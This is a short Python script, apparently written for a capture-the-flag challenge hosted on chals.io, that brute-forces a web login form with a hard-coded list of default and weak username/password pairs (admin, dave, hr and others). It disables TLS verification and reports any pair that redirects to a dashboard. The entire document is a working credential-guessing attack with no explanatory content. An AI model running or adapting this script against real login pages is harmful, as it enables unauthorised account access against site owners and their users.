import requests, urllib3
urllib3.disable_warnings()
base="https://kicyber-00f338d978e5-onboardx-0-0.chals.io"
creds=[("admin","admin"),("admin","password"),("admin","Password123"),("admin","admin123"),("admin","onboardx"),("admin","onboard"),("admin","password123"),("admin","Passw0rd"),("admin","admin666999"),("admin","dave"),("dave","password"),("dave","dave"),("dave","dave123"),("dave","Password123"),("dave","onboardx"),("hr","password"),("hr","hr"),("hr","hr123"),("hr","password123"),("alice","password"),("bob","password"),("carol","password"),("admin","123456"),("admin","12345678"),("admin","admin@123"),("admin","Admin@123"),("admin","P@ssw0rd"),("admin","Welcome1"),("admin","changeme")]
for u,p in creds:
    try:
        r=requests.post(base+"/login", data={"username":u,"password":p}, allow_redirects=False, verify=False, timeout=10)
    except Exception as e:
        continue
    loc=r.headers.get("Location","")
    if "/dashboard" in loc:
        print("SUCCESS", u, p)
    elif r.status_code==302 and "/login" in loc:
        pass
# Also check if token cookie differs
print("done")